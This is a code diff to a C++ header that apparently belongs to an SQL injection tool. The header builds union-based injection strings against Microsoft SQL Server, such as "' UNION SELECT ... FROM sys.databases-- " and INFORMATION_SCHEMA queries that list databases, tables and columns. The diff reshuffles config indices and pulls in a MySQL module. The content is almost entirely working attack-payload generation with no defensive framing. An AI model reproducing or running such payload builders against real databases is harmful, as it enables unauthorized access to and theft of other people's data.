@@ -1,15 +1,8 @@
 #ifndef MICROSOFTSQL_UNION_BASED
 #define MICROSOFTSQL_UNION_BASED
 
-#define OFFSET_LEN 6
-
-#define UNION_BASED_OFFSET 0
-#define UNION_BASED_MARK 1
-#define UNION_BASED_DATABASE 2
-#define UNION_BASED_TABLE 3
-#define UNION_BASED_COLUMN 4
-
 #include "../../Vaccine.hpp"
+#include "../mysql/mysql.hpp"
 
 struct microsoftsql_union_based
 {
@@ -24,15 +17,15 @@ struct microsoftsql_union_based
                         return "' UNION SELECT " + offset + "name " +
                                "FROM sys.databases-- ";
                 case TABLES:
-                        if (config[UNION_BASED_MARK])
+                        if (config[UNION_BASED_OFFSET + 1] != NULL)
                         {
                                 for (uint8 i = 0; i < OFFSET_LEN; ++i)
                                         config[UNION_BASED_OFFSET]->pop_back();
-                                config[UNION_BASED_MARK] = NULL;
+                                config[UNION_BASED_OFFSET + 1] = NULL;
                         }
                         return "' UNION SELECT " +
                                *config[UNION_BASED_OFFSET] + "TABLE_NAME " +
-                               "FROM " + *config[UNION_BASED_DATABASE] +
+                               "FROM " + *config[UNION_BASED_DATABASE + 1] +
                                ".INFORMATION_SCHEMA.TABLES-- ";
                 case COLUMNS:
                         return "' UNION SELECT " +
